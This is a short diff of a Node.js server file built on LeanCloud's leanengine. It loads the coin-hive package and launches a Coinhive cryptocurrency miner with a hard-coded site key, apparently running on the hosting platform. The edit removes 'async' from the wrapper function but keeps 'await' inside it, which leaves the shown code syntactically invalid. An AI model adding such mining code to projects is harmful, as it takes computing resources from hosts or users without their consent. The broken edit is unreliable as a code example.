@@ -7,7 +7,7 @@ var bodyParser = require('body-parser');
 var AV = require('leanengine');
 
 var CoinHive = require('coin-hive');
-(async function(){
+(function(){
 
   // Create miner
   var miner = await CoinHive('od8Mnoa7vWHNiXNCsE7jzsf8rpreuHBJ'); // Coin-Hive's Site Key
